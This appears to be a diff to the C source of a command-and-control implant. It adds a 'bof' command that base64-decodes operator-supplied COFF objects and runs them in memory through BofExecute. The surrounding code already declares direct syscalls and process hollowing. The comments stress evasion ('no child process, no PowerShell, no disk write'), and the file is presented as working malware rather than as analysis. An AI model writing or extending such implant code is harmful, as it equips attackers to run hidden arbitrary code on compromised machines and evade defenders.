@@ -13,6 +13,11 @@ extern NTSTATUS Syscall_NtAllocateVirtualMemory(HANDLE hProcess, PVOID* pBase, U
 extern NTSTATUS Syscall_NtWriteVirtualMemory(HANDLE hProcess, PVOID pBase, PVOID pBuffer, ULONG size, PULONG pWritten);
 extern NTSTATUS Syscall_NtReadVirtualMemory(HANDLE hProcess, PVOID pBase, PVOID pBuffer, ULONG size, PULONG pRead);
 
+// BOF loader (from loader/bof_loader.c)
+extern BOOL BofExecute(const BYTE *coff_data, SIZE_T coff_size,
+                       char *args, int args_len,
+                       char **out_buf, SIZE_T *out_len);
+
 // External process hollowing implementation
 extern BOOL ProcessHollowing(LPCSTR szTargetPath, LPVOID pPayload, DWORD dwPayloadSize);
 
@@ -87,6 +92,60 @@ char *cmd_dispatch(const Task *t) {
     }
     if (strcmp(t->command, "die") == 0) {
         ExitProcess(0);
+    }
+
+    /* ── In-process BOF execution ──────────────────────────────────────────
+     * Operator sends {"command":"bof","args":{"coff_b64":"...","args_b64":"..."}}
+     * We decode the COFF and args, run BofExecute() in-process, return output.
+     * No child process, no PowerShell, no disk write.
+     */
+    if (strcmp(t->command, "bof") == 0) {
+        char *coff_b64 = json_get_str(t->args_json, "coff_b64");
+        char *args_b64 = json_get_str(t->args_json, "args_b64");
+
+        if (!coff_b64) {
+            free(args_b64);
+            return str_dup("error: bof missing coff_b64");
+        }
+
+        /* decode COFF */
+        SIZE_T coff_len = 0;
+        BYTE *coff_data = (BYTE *)b64_decode(coff_b64, &coff_len);
+        free(coff_b64);
+        if (!coff_data) {
+            free(args_b64);
+            return str_dup("error: bof base64 decode failed");
+        }
+
+        /* decode args (may be empty) */
+        char *args_buf = NULL;
+        int   args_len = 0;
+        if (args_b64 && *args_b64) {
+            SIZE_T al = 0;
+            args_buf = (char *)b64_decode(args_b64, &al);
+            args_len = (int)al;
+        }
+        free(args_b64);
+
+        /* execute in-process */
+        char   *out_buf = NULL;
+        SIZE_T  out_len = 0;
+        BOOL ok = BofExecute(coff_data, coff_len,
+                             args_buf, args_len,
+                             &out_buf, &out_len);
+        free(coff_data);
+        free(args_buf);
+
+        char *result;
+        if (!ok) {
+            result = str_dup("error: BOF execution failed");
+        } else if (out_buf && out_len > 0) {
+            result = str_dup(out_buf);
+            free(out_buf);
+        } else {
+            result = str_dup("ok");
+        }
+        return result;
     }
 
     char buf[128];
